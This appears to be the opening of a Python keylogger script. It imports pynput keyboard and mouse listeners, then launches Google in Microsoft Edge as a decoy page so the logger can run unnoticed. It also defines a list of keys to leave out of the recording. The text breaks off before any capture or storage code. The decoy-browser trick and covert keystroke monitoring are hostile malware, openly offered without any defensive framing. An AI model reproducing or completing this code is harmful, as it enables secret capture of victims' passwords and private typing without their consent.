# ========== Keylogger ==========

import logging
import os
import webbrowser

from pynput import keyboard, mouse

# ========== Fake Browser ==========

# Creating a "fake" browser page where it actually runs the keylogger
url = 'http://www.google.com'

# & sign at the end makes the program run after the page opens
chrome_path = 'C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe %s &'

webbrowser.get(chrome_path).open(url)

# Some keyboard events that will not be recorded
unimportant_types = [keyboard.Key.down, keyboard.Key.up, keyboard.Key.left,
                     keyboard.Key.right, keyboard.Key.end, keyboard.Key.home,
                     keyboard.Key.insert, keyboard.Key.media_next,
                     keyboard.Key.media_play_pause, keyboard.Key.media_previous,
                     keyboard.Key.media_volume_down, keyboard.Key.media_volume_mute,
                     keyboard.Key.media_volume_up, keyboard.Key.menu,
                     keyboard.Key.num_lock, keyboard.Key.page_down, keyboard.Key.page_up,
                     keyboard.Key.pause, keyboard.Key.scroll_lock, keyboard.Key.shift_l,
                     keyboard.Key.shift_r, keyboard.Key.ctrl,  keyboard.Key.ctrl_r,
                     keyboard.Key.ctrl_l, keyboard.Key.alt_gr]
